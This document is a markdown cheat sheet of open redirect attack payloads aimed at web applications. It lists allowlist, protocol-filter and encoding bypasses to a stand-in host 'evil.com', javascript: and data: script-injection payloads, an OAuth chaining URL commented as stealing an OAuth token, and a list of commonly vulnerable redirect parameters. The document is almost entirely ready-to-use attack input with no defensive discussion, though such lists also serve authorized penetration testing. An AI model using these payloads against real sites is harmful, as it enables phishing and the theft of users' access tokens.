# Open Redirect Payloads

## Basic
```
https://target.com/redirect?url=https://evil.com
https://target.com/login?next=https://evil.com
https://target.com/out?target=https://evil.com
```

## Bypass — Allowlist Domain Checks
```
# Subdomain confusion
https://target.com.evil.com
https://evil.com?target.com
https://evil.com#target.com
https://evil.com/target.com

# @ trick
https://target.com@evil.com
https://target.com:80@evil.com

# Slash confusion
https://evil.com\target.com
https://evil.com/.target.com
//evil.com
////evil.com
```

## Bypass — Protocol Filters
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
//evil.com
\/\/evil.com
/\evil.com
```

## Bypass — URL Encoding
```
%68%74%74%70%73%3A%2F%2Fevil.com        (full URL encoded)
https:%2F%2Fevil.com
https:/%2Fevil.com
https://evil%2Ecom
https://evil%00.com
```

## Bypass — Double Encoding
```
%2568%2574%2574%2570%2573%3A%2F%2Fevil.com
https:%252F%252Fevil.com
```

## Bypass — Whitespace / Special Chars
```
https://evil.com%09
https://evil.com%0d
https://evil.com%0a
https://evil.com%20
https://evil.com%00
```

## Chaining with OAuth
```
# Steal OAuth token via open redirect
https://target.com/oauth/authorize?
  client_id=CLIENT&
  redirect_uri=https://target.com/redirect?url=https://evil.com&
  response_type=token
```

## Common Vulnerable Parameters
```
url=
redirect=
redirect_uri=
return=
returnTo=
return_url=
next=
dest=
destination=
forward=
go=
goto=
out=
target=
to=
link=
location=
continue=
```
